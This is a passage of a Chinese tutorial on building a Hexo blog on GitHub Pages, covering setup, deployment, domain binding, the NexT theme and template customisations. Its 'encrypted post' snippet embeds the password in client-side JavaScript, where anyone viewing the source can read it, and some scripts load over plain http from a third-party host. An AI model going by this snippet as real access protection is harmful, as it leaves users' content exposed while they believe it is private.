rel="noopener">域名注册</a>购买域名这也是我们整个搭建过程中惟一一个需要花钱的地方。如果你已经有了空闲域名就无需购买，直接使用即可。如下图是我购买的域名:<br><img src="http://p5m1dtoh7.bkt.clouddn.com/Hexo_Hithub_blog/my_host.PNG" alt="查看"></p></blockquote><h3 id="GitHub创建个人仓库"><a href="#GitHub创建个人仓库" class="headerlink" title="GitHub创建个人仓库"></a>GitHub创建个人仓库</h3><blockquote><p>登录到GitHub,如果没有GitHub帐号，使用你的邮箱注册GitHub帐号：<a href="https://github.com/" target="_blank" rel="noopener">GitHub</a> 点击GitHub中的<strong>New repository</strong>创建新仓库，仓库名应该为：<strong>用户名</strong>.github.io，这个<strong>用户名</strong>使用你的GitHub帐号名称代替，这是固定写法，比如我的仓库名为：<br><img src="http://p5m1dtoh7.bkt.clouddn.com/Hexo_Hithub_blog/github_host.jpg" alt="我的仓库名"></p></blockquote><h3 id="安装-由于这不是重点，就简单说下，网上很多方法"><a href="#安装-由于这不是重点，就简单说下，网上很多方法" class="headerlink" title="安装(由于这不是重点，就简单说下，网上很多方法)"></a>安装(由于这不是重点，就简单说下，网上很多方法)</h3><ul><li>安装git<blockquote><p>什么是Git ?简单来说Git是开源的分布式版本控制系统，用于敏捷高效地处理项目。我们网站在本地搭建好了，需要使用Git同步到GitHub上。如果想要了解Git的细节，参看<a href="http://weibo.com/liaoxuefeng" target="_blank" rel="noopener">廖雪峰</a>老师的Git教程：<a href="http://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000" target="_blank" rel="noopener">Git教程</a> 从Git官网下载：<a href="https://git-scm.com/download/win" target="_blank" rel="noopener">Git - Downloading Package</a> 现在的机子基本都是64位的，选择64位的安装包，下载后安装，在命令行里输入git测试是否安装成功，若安装失败，参看其他详细的Git安装教程。安装成功后，将你的Git与GitHub帐号绑定，绑定过程看<a href="http://weibo.com/liaoxuefeng" target="_blank" rel="noopener">廖雪峰</a>老师的Git教程</p></blockquote></li><li>安装Node.js<blockquote><p>Hexo基于Node.js，Node.js下载地址：<a href="https://nodejs.org/en/download/" target="_blank" rel="noopener">Download | Node.js</a> 下载安装包，注意安装Node.js会包含环境变量及npm的安装，安装后，检测Node.js是否安装成功，在命令行中输入 node -v :<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <img src="http://p5m1dtoh7.bkt.clouddn.com/Hexo_Hithub_blog/node_v.PNG" alt="node安装截图"><br>检测npm是否安装成功，在命令行中输入npm -v :<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  <img src="http://p5m1dtoh7.bkt.clouddn.com/Hexo_Hithub_blog/npm_v.PNG" alt="npm安装截图"></p></blockquote></li><li><p>安装hexo</p><blockquote><p>Hexo就是我们的个人博客网站的框架， 这里需要自己在电脑常里创建一个文件夹，可以命名为Blog，Hexo框架与以后你自己发布的网页都在这个文件夹中。创建好后，进入文件夹中:<br>使用npm命令安装Hexo，输入 <em>npm install -g hexo</em><br><br><br>这个安装时间较长耐心等待，安装完成后，初始化我们的博客，输入：<br><em>hexo init blog</em><br>注意，这里的命令都是作用在刚刚创建的Blog文件夹中。<br>为了检测我们的网站雏形，分别按顺序输入以下三条命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo new test_my_site</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>这些命令在后面作介绍，完成后，打开浏览器输入地址：           localhost:4000<br>可以看出我们写出第一篇博客</p></blockquote></li></ul><h2 id="推送网站"><a href="#推送网站" class="headerlink" title="推送网站"></a>推送网站</h2><blockquote><p>上面只是在本地预览，接下来要做的就是就是推送网站，也就是发布网站，让我们的网站可以被更多的人访问。在设置之前，需要解释一个概念，在blog根目录里的<code>_config.yml</code>文件称为<strong>站点</strong>配置文件，如下图:<img src="http://p5m1dtoh7.bkt.clouddn.com/Hexo_Hithub_blog/site_config.PNG" alt=""><br><br><br>进入根目录里的themes文件夹，里面也有个<code>_config.yml</code>文件，这个称为<strong>主题</strong>配置文件，如下图:<img src="http://p5m1dtoh7.bkt.clouddn.com/Hexo_Hithub_blog/theme_config.PNG" alt=""><br>下一步将我们的Hexo与GitHub关联起来，打开站点的配置文件<code>_config.yml</code>，翻到最后修改为：<br><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line"><span class="attr">  type:</span> <span class="string">git</span></span><br><span class="line"><span class="attr">  repository:</span> <span class="string">git@github.com:你的用户名/你的用户名.github.io.git</span></span><br><span class="line"><span class="attr">  branch:</span> <span class="string">master</span></span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>保存站点配置</p><ul><li>运行：<em>npm install hexo-deployer-git –save</em></li><li>运行：<em>hexo g</em>（本地生成静态文件)</li><li>运行：<em>hexo d</em>（将本地静态文件推送至Github）</li></ul><p>此时，打开浏览器，访问<em><a href="http://longofo.github.io/" target="_blank" rel="noopener">http://longofo.github.io</a></em></p></blockquote><h2 id="绑定域名"><a href="#绑定域名" class="headerlink" title="绑定域名"></a>绑定域名</h2><blockquote><p>博客已经搭建好，也能通过github的域名访问，但总归还是用自己的域名比较舒服。因为我们需要设置将自己的域名绑定到github这个博客项目上。</p><ul><li>域名提供商设置<br>  添加2条A记录：<br>  @—&gt;192.30.252.154<br>  @—&gt;192.30.252.153<br>  添加一条CNAME记录：<br>  CNAME—&gt;你的用户名.github.io<br>  如图：<img src="http://p5m1dtoh7.bkt.clouddn.com/Hexo_Hithub_blog/host_jiexi.PNG" alt="npm安装截图"></li><li>博客添加CNAME文件<br>配置完域名解析后，进入博客目录，在站点<code>source</code>目录下新建CNAME文件，写入域名，如：longofo.cc</li><li>运行：<em>hexo g</em> </li><li>运行：<em>hexo d</em></li></ul></blockquote><h2 id="更换主题"><a href="#更换主题" class="headerlink" title="更换主题"></a>更换主题</h2><blockquote><p>如果你不喜欢Hexo默认的主题，可以更换不同的主题，主题传送门：<a href="https://hexo.io/themes/" target="_blank" rel="noopener">Themes</a>  我自己使用的是Next主题，可以在blog目录中的themes文件夹中查看你自己主题是什么。现在把默认主题更改成Next主题，在blog目录中（就是命令行的位置处于blog目录）打开命令行输入：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/iissnan/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>这是将Next主题下载到blog目录的themes主题下的next文件夹中。打开<strong>主题</strong>的_config.yml配置文件，修改主题为next，如图：<br><img src="http://p5m1dtoh7.bkt.clouddn.com/Hexo_Hithub_blog/scheme.PNG" alt="npm安装截图"><br>打开<strong>主题</strong>的_config.yml配置文件，不是站点主题文件，找到Scheme Settings<br><img src="http://p5m1dtoh7.bkt.clouddn.com/Hexo_Hithub_blog/scheme_choice.PNG" alt=""><br>next主题有三个样式，我用的是Mist，你们可以自己试试看，选择你自己喜欢的样式（只需要把行首的#去除，#是注释），选择好后，再次部署网站，hexo g、hexo d，查看效果。选择其他主题，按照上述过程即可实现。</p></blockquote><h2 id="初识MarkDown语法"><a href="#初识MarkDown语法" class="headerlink" title="初识MarkDown语法"></a>初识MarkDown语法</h2><blockquote><p>Markdown是一种可以使用普通文本编辑器编写的标记语言，通过简单的标记语法，它可以使普通文本内容具有一定的格式。Markdown语法简洁明了、容易掌握，而且功能比纯文本更强，因此写博客使用它，可以让用户更加专注的写文章，而不需要费尽心力的考虑样式，相对于html已经算是轻量级语言，像有道云笔记也支持Markdown写作。并且Markdown完全兼容html，也就是可以在文章里直接插入html代码。比如给博文添加音乐，就可以直接把音乐的外链html代码插入文章中。具体语法参看：<a href="http://www.appinn.com/markdown/" target="_blank" rel="noopener">Markdown 语法说明(简体中文版)</a> 可以说十分钟就可以入门。当然，工欲善其事必先利其器，选择一个好的Markdown编辑器也是非常重要的，这里推荐<a href="http://code52.org/DownmarkerWPF/" target="_blank" rel="noopener">MarkPad</a> 和<a href="http://www.markdownpad.com/" target="_blank" rel="noopener">The Markdown Editor for Windows</a> ，这是带有预览效果的编辑器，也可以使用本地的文本编辑器，更多的Markdown的语法与编辑器自己可以搜索了解。</p></blockquote><h2 id="写博客"><a href="#写博客" class="headerlink" title="写博客"></a>写博客</h2><blockquote><p>至此博客已经搭建完毕，域名也已经正常解析，那么剩下的问题就是更新内容了。</p></blockquote><h3 id="更新文章"><a href="#更新文章" class="headerlink" title="更新文章"></a>更新文章</h3><blockquote><ul><li>在MyBlog目录下执行：<em>hexo new “我的第一篇文章”</em>，会在source_posts文件夹内生成一个.md文件。<ul><li>编辑该文件（遵循Markdown规则）<ul><li>修改起始字段</li><li>title 文章的标题</li><li>date 创建日期 （文件的创建日期 ）</li><li>updated 修改日期 （ 文件的修改日期）</li><li>comments 是否开启评论 true or false</li><li>tags 标签</li><li>categories 分类</li><li>permalink url中的名字（文件名）</li><li>编写正文内容（使用MakeDown语法）</li></ul></li></ul></li><li>hexo clean 删除本地静态文件（Public目录），可不执行。</li><li>hexo g 生成本地静态文件（Public目录）</li><li>hexo deploy 将本地静态文件推送至github（hexo d）</li></ul></blockquote><h3 id="添加菜单"><a href="#添加菜单" class="headerlink" title="添加菜单"></a>添加菜单</h3><blockquote><p>进入theme目录，编辑<code>\next\_config.yml</code>文件，找到menu:字段，在该字段下添加一个字段。<br><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line"><span class="attr">  home:</span> <span class="string">/</span></span><br><span class="line"><span class="attr">  about:</span> <span class="string">/about</span></span><br><span class="line">  <span class="string">......</span></span><br></pre></td></tr></table></figure></p></blockquote><p>然后到<code>themes\next\languages</code>下找到lanhuages目录，编辑<code>zh-Hans.yml</code>(检查下<strong>站点</strong>配置文件中的language的值是否为zh-Hans)文件：<br><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line"><span class="attr">  home:</span> <span class="string">首页</span></span><br><span class="line"><span class="attr">  about:</span> <span class="string">关于作者</span></span><br><span class="line">  <span class="string">......</span></span><br></pre></td></tr></table></figure></p><h2 id="高度定制优化篇"><a href="#高度定制优化篇" class="headerlink" title="高度定制优化篇"></a>高度定制优化篇</h2><h3 id="文章中添加居中模块"><a href="#文章中添加居中模块" class="headerlink" title="文章中添加居中模块"></a>文章中添加居中模块</h3><blockquote><p>文章Markdown中填写如下：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">blockquote</span> <span class="attr">class</span>=<span class="string">"blockquote-center"</span>&gt;</span>优秀的人，不是不合群，而是他们合群的人里面没有你<span class="tag">&lt;/<span class="name">blockquote</span>&gt;</span></span><br></pre></td></tr></table></figure></p></blockquote><h3 id="在文章底部增加版权信息"><a href="#在文章底部增加版权信息" class="headerlink" title="在文章底部增加版权信息"></a>在文章底部增加版权信息</h3><blockquote><p>在目录 <code>next/layout/_macro/</code>下添加 my-copyright.swig：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if page.copyright %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"my_post_copyright"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- JS库 sweetalert 可修改路径 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">href</span>=<span class="string">"http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>本文标题:<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;&#123; url_for(page.path) &#125;&#125;"</span>&gt;</span>&#123;&#123; page.title &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>文章作者:<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/"</span> <span class="attr">title</span>=<span class="string">"访问 &#123;&#123; theme.author &#125;&#125; 的个人博客"</span>&gt;</span>&#123;&#123; theme.author &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>发布时间:<span class="tag">&lt;/<span class="name">span</span>&gt;</span>&#123;&#123; page.date.format("YYYY年MM月DD日 - HH:MM") &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>最后更新:<span class="tag">&lt;/<span class="name">span</span>&gt;</span>&#123;&#123; page.updated.format("YYYY年MM月DD日 - HH:MM") &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>原始链接:<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;&#123; url_for(page.path) &#125;&#125;"</span> <span class="attr">title</span>=<span class="string">"&#123;&#123; page.title &#125;&#125;"</span>&gt;</span>&#123;&#123; page.permalink &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"copy-path"</span>  <span class="attr">title</span>=<span class="string">"点击复制文章链接"</span>&gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-clipboard"</span> <span class="attr">data-clipboard-text</span>=<span class="string">"&#123;&#123; page.permalink &#125;&#125;"</span>  <span class="attr">aria-label</span>=<span class="string">"复制成功！"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>许可协议:<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-creative-commons"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">rel</span>=<span class="string">"license"</span> <span class="attr">href</span>=<span class="string">"https://creativecommons.org/licenses/by-nc-nd/4.0/"</span> <span class="attr">target</span>=<span class="string">"_blank"</span> <span class="attr">title</span>=<span class="string">"Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)"</span>&gt;</span>署名-非商业性使用-禁止演绎 4.0 国际<span class="tag">&lt;/<span class="name">a</span>&gt;</span> 转载请保留原文链接及作者。<span class="tag">&lt;/<span class="name">p</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"> </span></span><br><span class="line"><span class="undefined">    var clipboard = new Clipboard('.fa-clipboard');</span></span><br><span class="line"><span class="undefined">    clipboard.on('success', $(function()&#123;</span></span><br><span class="line"><span class="undefined">      $(".fa-clipboard").click(function()&#123;</span></span><br><span class="line"><span class="undefined">        swal(&#123;   </span></span><br><span class="line"><span class="undefined">          title: "",   </span></span><br><span class="line"><span class="undefined">          text: '复制成功',   </span></span><br><span class="line"><span class="undefined">          html: false,</span></span><br><span class="line"><span class="undefined">          timer: 500,   </span></span><br><span class="line"><span class="undefined">          showConfirmButton: false</span></span><br><span class="line"><span class="undefined">        &#125;);</span></span><br><span class="line"><span class="undefined">      &#125;);</span></span><br><span class="line"><span class="undefined">    &#125;));  </span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>在目录<code>next/source/css/_common/components/post/</code>下添加my-post-copyright.styl：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.my_post_copyright</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">85%</span>;</span><br><span class="line">  <span class="attribute">max-width</span>: <span class="number">45em</span>;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">2.8em</span> auto <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0.5em</span> <span class="number">1.0em</span>;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#d3d3d3</span>;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">0.93rem</span>;</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">1.6em</span>;</span><br><span class="line">  <span class="attribute">word-break</span>: break-all;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">rgba</span>(255,255,255,0.4);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.my_post_copyright</span> <span class="selector-tag">p</span>&#123;<span class="attribute">margin</span>:<span class="number">0</span>;&#125;</span><br><span class="line"><span class="selector-class">.my_post_copyright</span> <span class="selector-tag">span</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: inline-block;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">5.2em</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#b5b5b5</span>;</span><br><span class="line">  <span class="attribute">font-weight</span>: bold;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.my_post_copyright</span> <span class="selector-class">.raw</span> &#123;</span><br><span class="line">  <span class="attribute">margin-left</span>: <span class="number">1em</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">5em</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.my_post_copyright</span> <span class="selector-tag">a</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#808080</span>;</span><br><span class="line">  <span class="attribute">border-bottom</span>:<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.my_post_copyright</span> <span class="selector-tag">a</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#a3d2a3</span>;</span><br><span class="line">  <span class="attribute">text-decoration</span>: underline;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.my_post_copyright</span><span class="selector-pseudo">:hover</span> <span class="selector-class">.fa-clipboard</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#000</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.my_post_copyright</span> <span class="selector-class">.post-url</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">  <span class="attribute">font-weight</span>: normal;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.my_post_copyright</span> <span class="selector-class">.copy-path</span> &#123;</span><br><span class="line">  <span class="attribute">margin-left</span>: <span class="number">1em</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">1em</span>;</span><br><span class="line">  +mobile()&#123;display:none;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.my_post_copyright</span> <span class="selector-class">.copy-path</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#808080</span>;</span><br><span class="line">  <span class="attribute">cursor</span>: pointer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>修改next/layout/_macro/post.swig，在代码<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">      &#123;% if not is_index %&#125;</span><br><span class="line">        &#123;% include 'wechat-subscriber.swig' %&#125;</span><br><span class="line">      &#123;% endif %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>之前添加增加如下代码：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">      &#123;% if not is_index %&#125;</span><br><span class="line">        &#123;% include 'my-copyright.swig' %&#125;</span><br><span class="line">      &#123;% endif %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>修改next/source/css/_common/components/post/post.styl文件，在最后一行增加代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@import &quot;my-post-copyright&quot;</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>如果要在该博文下面增加版权信息的显示，需要在 Markdown 中增加copyright: true的设置，类似：<br><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span></span><br><span class="line"><span class="attr">date:</span></span><br><span class="line"><span class="attr">tags:</span></span><br><span class="line"><span class="attr">categories:</span></span><br><span class="line"><span class="attr">copyright:</span> <span class="literal">true</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure></p></blockquote><h3 id="自定义hexo-new生成md文件的选项"><a href="#自定义hexo-new生成md文件的选项" class="headerlink" title="自定义hexo new生成md文件的选项"></a>自定义hexo new生成md文件的选项</h3><blockquote><p>在<code>/scaffolds/post.md</code>文件中添加：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: &#123;&#123; title &#125;&#125;</span><br><span class="line">date: &#123;&#123; date &#125;&#125;</span><br><span class="line">tags:</span><br><span class="line">categories: </span><br><span class="line">copyright: true</span><br><span class="line">permalink: 01</span><br><span class="line">top: 0</span><br><span class="line">password:</span><br><span class="line">---</span><br></pre></td></tr></table></figure></p></blockquote><h3 id="隐藏网页底部powered-By-Hexo-强力驱动"><a href="#隐藏网页底部powered-By-Hexo-强力驱动" class="headerlink" title="隐藏网页底部powered By Hexo / 强力驱动"></a>隐藏网页底部powered By Hexo / 强力驱动</h3><blockquote><p>打开<code>themes/next/layout/_partials/footer.swig</code>,使用<!-- -->隐藏之间的代码即可，或者直接删除。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">&lt;div class="powered-by"&gt;</span></span><br><span class="line"><span class="comment">  &#123;&#123; __('footer.powered', '&lt;a class="theme-link" rel="external nofollow" href="https://hexo.io"&gt;Hexo&lt;/a&gt;') &#125;&#125;</span></span><br><span class="line"><span class="comment">&lt;/div&gt;</span></span><br><span class="line"><span class="comment">&lt;div class="theme-info"&gt;</span></span><br><span class="line"><span class="comment">  &#123;&#123; __('footer.theme') &#125;&#125; -</span></span><br><span class="line"><span class="comment">  &lt;a class="theme-link" rel="external nofollow" href="https://github.com/iissnan/hexo-theme-next"&gt;</span></span><br><span class="line"><span class="comment">    NexT.&#123;&#123; theme.scheme &#125;&#125;</span></span><br><span class="line"><span class="comment">  &lt;/a&gt;</span></span><br><span class="line"><span class="comment">&lt;/div&gt;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure></p></blockquote><h3 id="文章加密访问"><a href="#文章加密访问" class="headerlink" title="文章加密访问"></a>文章加密访问</h3><blockquote><p>打开themes-&gt;next-&gt;layout-&gt;_partials-&gt;head.swig文件,在meta标签后面插入这样一段代码：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    (<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">'&#123;&#123; page.password &#125;&#125;'</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span> (prompt(<span class="string">'请输入文章密码'</span>) !== <span class="string">'&#123;&#123; page.password &#125;&#125;'</span>)&#123;</span><br><span class="line">                alert(<span class="string">'密码错误！'</span>);</span><br><span class="line">                history.back();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)();</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>然后文章中添加：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password: 你的密码</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>如果password后面为空，则表示不用密码。</p></blockquote><h3 id="博文置顶"><a href="#博文置顶" class="headerlink" 